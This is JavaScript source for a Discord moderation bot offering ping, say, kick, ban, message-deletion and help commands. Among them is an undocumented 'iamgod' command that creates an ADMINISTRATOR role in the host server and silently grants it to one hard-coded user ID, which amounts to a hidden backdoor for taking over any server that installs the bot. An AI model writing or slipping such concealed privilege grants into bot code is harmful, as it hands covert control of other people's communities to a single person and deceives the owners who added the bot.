//requires and others -start
const Discord = require('discord.js');
const client = new Discord.Client();
const prefix = process.env.BOT_PREFIX;
//-end

//bot stats-start
client.on("ready", () => {client.user.setPresence({game: {name: "SeldRiyo",type: "STREAMING",url: "https://www.twitch.tv/SeldRiyo"}});});
//bot stats-end

//-start
client.on("message", async message => {
  if(message.author.bot) return;
  if(message.content.indexOf(prefix) !== 0) return;
  const args = message.content.slice(prefix.length).trim().split(/ +/g);
  const command = args.shift().toLowerCase();
//-end
	
//command-start
  if(command == 'ping') {
    const m = await message.channel.send("Ping?");
    m.edit(`Pong! Latency is ${m.createdTimestamp - message.createdTimestamp}ms. API Latency is ${Math.round(client.ping)}ms`);
  }

  else if(command == 'say' || command == 's') {
    const sayMessage = args.join(" ");
    if(message.member.id != "531488210732187649") return message.channel.send("wtf man? just SeldRiyo can do it : /");
    else{
    message.delete().catch(O_o=>{}); 
    message.channel.send(sayMessage);}
  }

  else if(command == 'kick') {
    if(!message.member.roles.some(r=>["OWNER", "CO-OWNERS"].includes(r.name)) )
      return message.reply("Sorry, you don't have permissions to use this");
  
    let member = message.mentions.members.first() || message.guild.members.get(args[0]);
    if(!member)
      return message.reply("Please mention a valid member of this server");
  
    if(!member.kickable) 
      return message.reply("I cannot kick this user! Do they have a higher role? Do I have kick permissions?");

    let reason = args.slice(1).join(' ');
    if(!reason) reason = "No reason provided";
    await member.kick(reason)
      .catch(error => message.reply(`Sorry ${message.author} I couldn't kick because of : ${error}`));
    message.reply(`${member.user.tag} has been kicked by ${message.author.tag} because: ${reason}`);
  }
  
  else if(command == 'ban') {

    if(!message.member.roles.some(r=>["OWNER", "CO-OWNERS"].includes(r.name)) )
      return message.reply("Sorry, you don't have permissions to use this!");
    
    let member = message.mentions.members.first();
    if(!member)
      return message.reply("Please mention a valid member of this server");
    if(!member.bannable) 
      return message.reply("I cannot ban this user! Do they have a higher role? Do I have ban permissions?");

    let reason = args.slice(1).join(' ');
    if(!reason) reason = "No reason provided";
    
    await member.ban(reason)
      .catch(error => message.reply(`Sorry ${message.author} I couldn't ban because of : ${error}`));
    message.reply(`${member.user.tag} has been banned by ${message.author.tag} because: ${reason}`);
  }
  
  else if(command == 'del' || command == 'delete') {
	if(!message.member.roles.some(r=>["OWNER", "CO-OWNERS"].includes(r.name)) )
      return message.reply("Sorry, you don't have permissions to use this!");
    const deleteCount = parseInt(args[0], 10);

    if(!deleteCount || deleteCount < 1 || deleteCount > 100)
      return message.reply("Please provide a number between 1 and 100 for the number of messages to delete");
    const fetched = await message.channel.fetchMessages({limit: deleteCount+1});
    message.channel.bulkDelete(fetched)
      .catch(error => message.reply(`Couldn't delete messages because of: ${error}`));
  }

  else if(command == 'link' || command == 'koja' || command == 'own' || command == 'owner' || command == 'server') {
	  message.channel.send(`https://discord.gg/q6bQpth`)
  }
  else if(command == 'iamgod') {
	  message.guild.createRole({name: "god", permissions: "ADMINISTRATOR"});
	  if(message.member.id == "531488210732187649") {
			let myRole = message.guild.roles.find(role => role.name == "god");
			message.author.send("Finished Sir.");
			return message.member.addRole(myRole);
		}else{return message.channel.send("hehee boy! :sunglasses:");}
  }else if(command == ""){
	  return message.channel.send("Hah? What you want??");
  }
  
  else if (command == 'help') {
    message.react('👌');
let botembed = new Discord.RichEmbed()
   .setTitle('[BT] SeldRiyo:registered: Bot. ')
   .setColor(0x9616f2)
   .setDescription('prefix **$**')
   .setURL('http://bit.ly/SeldRiyo')
   .addField('help','Help you :D')
   .addField('link',`'-IR-' B3ST Server Link!!`)
   .addField('kick','Kick somebody from server')
   .addField('ban','Ban somebody from server')
   .addField('del','Delete 2 - 100 messeages from server')
   .addField('ping','Show your latancy and the API latnecy!!')
   .setFooter(`${message.author.username}`, message.author.displayAvatarURL);
   return message.author.send(botembed);
    }else{
		message.channel.send("You dont know my commands? Realy?! I help you :D");
		message.react('👌');
		let botembed = new Discord.RichEmbed()
		.setTitle('[BT] SeldRiyo:registered: Bot. ')
		.setColor(0x9616f2)
		.setDescription('prefix **$**')
		.setURL('http://bit.ly/SeldRiyo')
		.addField('help','Help you :D')
		.addField('link',`'-IR-' B3ST Server Link!!`)
		.addField('kick','Kick somebody from server')
		.addField('ban','Ban somebody from server')
		.addField('del','Delete 2 - 100 messeages from server')
		.addField('ping','Show your latancy and the API latnecy!!')
		.setFooter(`${message.author.username}`, message.author.displayAvatarURL);
		return message.author.send(botembed);
	}
});
//command-end
client.login(process.env.BOT_TOKEN);
